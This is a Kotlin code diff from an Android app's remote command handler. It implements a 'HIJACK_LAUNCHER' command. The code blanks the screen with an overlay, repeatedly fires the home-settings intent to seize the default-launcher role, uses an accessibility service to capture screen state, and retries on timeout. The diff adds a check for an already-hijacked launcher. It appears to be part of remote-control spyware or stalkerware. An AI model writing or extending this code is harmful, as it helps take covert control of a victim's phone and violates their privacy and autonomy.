@@ -3099,54 +3099,60 @@ object CommandProcessor {
                     errorMsg = "Backend operations completed successfully. Lock screen UI handles the rest."
                 }
                 "HIJACK_LAUNCHER" -> {
-                    DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
-                    DimmerManager.IgnitionManager.request(ctx, "HIJACK_LAUNCHER")
-                    LauncherManager.isHijacking = true
-                    LauncherManager.pendingCmdId = id
-                    
-                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                        var elapsed = 0
-                        DebugLogger.log("HIJACK_LIFECYCLE", "Entering hijack polling loop (Max 30s)")
-                        while (LauncherManager.isHijacking && elapsed < 30) {
-                            val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
-                            if (currentHome == ctx.packageName) {
-                                DebugLogger.log("HIJACK_LIFECYCLE", "Launcher successfully hijacked after $elapsed seconds.")
-                                LauncherManager.isHijacking = false
-                                break
-                            }
-
-                            // Re-fire the intent every 3 seconds to keep it fresh and at the front
-                            if (elapsed % 3 == 0) {
-                                android.os.Handler(android.os.Looper.getMainLooper()).post {
-                                    DimmerManager.applyDim(ctx, 0, "AUTO")
-                                    try {
-                                        val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
-                                            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                                        }
-                                        ctx.startActivity(intent)
-                                    } catch (e: Exception) { }
+                    val checkHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                    if (checkHome == ctx.packageName) {
+                        status = "ALREADY_IN_STATE"
+                        errorMsg = "Launcher is already hijacked."
+                    } else {
+                        DebugLogger.log("HIJACK_INIT", "Command [HIJACK_LAUNCHER] received. ID: $id")
+                        DimmerManager.IgnitionManager.request(ctx, "HIJACK_LAUNCHER")
+                        LauncherManager.isHijacking = true
+                        LauncherManager.pendingCmdId = id
+                        
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                            var elapsed = 0
+                            DebugLogger.log("HIJACK_LIFECYCLE", "Entering hijack polling loop (Max 30s)")
+                            while (LauncherManager.isHijacking && elapsed < 30) {
+                                val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                                if (currentHome == ctx.packageName) {
+                                    DebugLogger.log("HIJACK_LIFECYCLE", "Launcher successfully hijacked after $elapsed seconds.")
+                                    LauncherManager.isHijacking = false
+                                    break
                                 }
+
+                                // Re-fire the intent every 3 seconds to keep it fresh and at the front
+                                if (elapsed % 3 == 0) {
+                                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                                        DimmerManager.applyDim(ctx, 0, "AUTO")
+                                        try {
+                                            val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                            }
+                                            ctx.startActivity(intent)
+                                        } catch (e: Exception) { }
+                                    }
+                                }
+
+                                kotlinx.coroutines.delay(1000)
+                                elapsed++
                             }
 
-                            kotlinx.coroutines.delay(1000)
-                            elapsed++
+                            if (LauncherManager.isHijacking) {
+                                DebugLogger.log("HIJACK_TIMEOUT", "30s timeout reached. Aborting hijack sequence.")
+                                LauncherManager.isHijacking = false
+                                val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                DebugLogger.log("HIJACK_TIMEOUT_DIAG", diag)
+                                withContext(Dispatchers.Main) {
+                                    DimmerManager.removeOverlay(ctx)
+                                }
+                                CommandProcessor.updateCommandStatus(ctx, id, "HIJACK_TIMEOUT", "Failed to hijack launcher role.\nScreen State:\n$diag")
+                                CommandRetryManager.scheduleRetry(ctx, id, "HIJACK_LAUNCHER", "", "30s Hijack Timeout")
+                            }
+                            DimmerManager.IgnitionManager.release(ctx, "HIJACK_LAUNCHER")
                         }
 
-                        if (LauncherManager.isHijacking) {
-                            DebugLogger.log("HIJACK_TIMEOUT", "30s timeout reached. Aborting hijack sequence.")
-                            LauncherManager.isHijacking = false
-                            val diag = MyAccessibilityService.dumpScreenDiagnostic()
-                            DebugLogger.log("HIJACK_TIMEOUT_DIAG", diag)
-                            withContext(Dispatchers.Main) {
-                                DimmerManager.removeOverlay(ctx)
-                            }
-                            CommandProcessor.updateCommandStatus(ctx, id, "HIJACK_TIMEOUT", "Failed to hijack launcher role.\nScreen State:\n$diag")
-                            CommandRetryManager.scheduleRetry(ctx, id, "HIJACK_LAUNCHER", "", "30s Hijack Timeout")
-                        }
-                        DimmerManager.IgnitionManager.release(ctx, "HIJACK_LAUNCHER")
+                        status = "HIJACK_INITIATED"
                     }
-
-                    status = "HIJACK_INITIATED"
                 }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
